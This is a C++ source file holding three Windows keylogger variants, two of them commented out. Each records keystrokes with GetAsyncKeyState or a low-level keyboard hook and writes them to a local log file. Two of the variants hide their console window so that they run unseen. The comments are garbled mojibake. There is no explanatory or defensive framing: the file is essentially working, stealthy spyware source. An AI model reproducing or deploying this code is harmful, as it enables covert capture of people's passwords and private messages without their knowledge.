/*
#include <iostream>
#include "windows.h"
#include <fstream>
#include <String>
using namespace std;
int main()
{
	ofstream File; //����. �-�
	File.open("log.txt");//���. � ����������
	FreeConsole();// ������� �� �������
	string log = ""; // �������. ����������
	string letter = "";
	int num = 0;

	while (1)// ���������� ����
	{
		for (num = 32; num <= 90; num++)// ���� 32? 
		{
			switch (num)
			{
			case 65: letter = "a"; break;
			case 66: letter = "b"; break;
			case 67: letter = "c"; break;
			case 68: letter = "d"; break;
			case 69: letter = "e"; break;
			case 70: letter = "f"; break;
			case 71: letter = "g"; break;
			case 72: letter = "h"; break;
			case 73: letter = "i"; break;
			case 74: letter = "j"; break;
			case 75: letter = "k"; break;
			case 76: letter = "l"; break;
			case 77: letter = "m"; break;
			case 78: letter = "n"; break;
			case 79: letter = "o"; break;
			case 80: letter = "p"; break;
			case 81: letter = "q"; break;
			case 82: letter = "r"; break;
			case 83: letter = "s"; break;
			case 84: letter = "t"; break;
			case 85: letter = "u"; break;
			case 86: letter = "v"; break;
			case 87: letter = "w"; break;
			case 88: letter = "x"; break;
			case 89: letter = "y"; break;
			case 90: letter = "z"; break;
			case 32: letter = " "; break;
			}
			if (GetAsyncKeyState(num))//�������� ��� ������ ������� 
			{
				log += letter;
				Sleep(200);
			}
			if (GetAsyncKeyState(27))
			{
				File << log;
				File.close();
				return 0;

			}
		}
	}
}
//*/

//*
#include <iostream>      
#include <windows.h>
#include <winuser.h>

#define _CRT_SECURE_NO_WARNINGS

using namespace std;


int S(int key, char *files)
{
	if ((key == 1) || (key == 2))
		return 0;

	FILE *Save;
	Save = fopen(files, "a+");
	cout << key << endl;
	fprintf(Save, "%s", &key);
	fclose(Save);
	return 0;
}

void Hide()
{
	HWND Hide;
	AllocConsole();
	Hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Hide, 0);
}

int main()
{
	Hide();
	char q;
	int a = 0;

	while (1)
	{
		for (q = 8; q <= 190; q++)
		{
			if (GetAsyncKeyState(q) == -32767)
				S(q, "log.txt");
			else {
				a++;
				if (a == 15)
				{
					Sleep(1);
					a = 0;
				}
			}
		}
	}
	system("PAUSE");
	return 0;
}
//*/


/*
#include <windows.h>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <string>

using namespace std;

string myKey;
BOOL isCaps();

char logName[] = "keys.txt";//LOG FILE name

							//init all varibles for speed
MSG message;
HHOOK keyboardHook;
char keyNameBuff[16];
PKBDLLHOOKSTRUCT p;
unsigned int sc;
//��������� ��� Windows
void writeToLog(string s) //write a string to the log
{
	ofstream log(logName, ios::app); //opens log file

	log << s; //writes to log.. with format '['']'

	log.close(); //closes log
}
// ��������� ��� Windows
BOOL isCaps()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ||
		((GetKeyState(VK_SHIFT) & 0x8000) != 0)) {
		return 1;
	}
	else {
		return 0;
	}
}
// ��������� ��� Windows
LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)//proc to be run on hooked key
{
	if (wParam == WM_KEYDOWN)//if key event type is key down
	{
		//get the keyname from lParam
		p = (PKBDLLHOOKSTRUCT)(lParam);//used to get the vkCode

		sc = MapVirtualKey(p->vkCode, 0);
		sc <<= 16; //shift 16 bits

		if (!(p->vkCode <= 32))//if not ascii
		{
			sc |= 0x1 << 24; // <- extended bit
		}

		GetKeyNameTextA(sc, keyNameBuff, 16);
		// ��������� ��� Windows - �������� 
		//gets ASCII key name from sc into keyNameBuff

		//write keyname to log
		myKey = keyNameBuff;
		if (myKey == "Space") {
			writeToLog(" ");
		}
		else if (myKey == "Right Alt") {
			writeToLog("[R ALT]");
		}
		else if (myKey == "Enter") {
			writeToLog("[ENTER]");
		}
		else if (myKey == "Left Alt") {
			writeToLog("[L ALT]");
		}
		else if (myKey == "Tab") {
			writeToLog("[TAB]");
		}
		else if (myKey == "Backspace") {
			writeToLog("[BS]");
		}
		else if (myKey == "Caps Lock") {
			writeToLog("[CAPS]");
		}
		else if (myKey == "Delete") {
			writeToLog("[DEL]");
		}
		else if (myKey == "Right Shift") {
			writeToLog("[R SHIFT]");
		}
		else if (myKey == "Shift") {
			writeToLog("[L SHIFT]");
		}
		else if (myKey == "Ctrl") {
			writeToLog("[L CTRL]");
		}
		else if (myKey == "Right Ctrl") {
			writeToLog("[R CTRL]");
		}
		// if its none of the special keys
		else {
			if (isCaps() == 1) {
				writeToLog(myKey);
			}
			else {
				std::transform(myKey.begin(), myKey.end(),
					myKey.begin(), ::tolower);
				writeToLog(myKey);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
// ��������� ��� Windows
void msgLoop()
{
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}
// ��������� ��� Windows
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		hookProc, hInstance, 0); //hooks keyboard

	msgLoop(); //stops from closing
			   // ��������� ��� Windows - ��������
	UnhookWindowsHookEx(keyboardHook); //unhooks

	return 0; //Never run
}
//*/


